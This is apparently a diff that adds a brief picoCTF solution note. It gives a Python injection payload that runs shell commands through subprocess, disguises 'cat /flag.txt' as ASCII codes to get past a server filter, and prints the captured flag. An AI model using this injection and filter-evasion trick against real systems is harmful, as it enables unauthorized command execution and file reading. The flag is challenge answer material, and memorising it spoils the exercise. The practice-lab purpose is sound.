@@ -1,0 +1,10 @@
+###########The sever does not accept 'cat /flag.txt'###########3
+All you do is convert that to Ascii
+__import__("subprocess").getoutput("".join(chr(x) for x in [99, 97, 116, 32, 47, 102, 108, 97, 103, 46, 116, 120, 116]))
+
+
+you first need to try 
+__import__("subprocess").getoutput("id")
+
+#########flag################
+ picoCTF{D0nt_Use_Unsecure_f@nctions3ce5e79c}
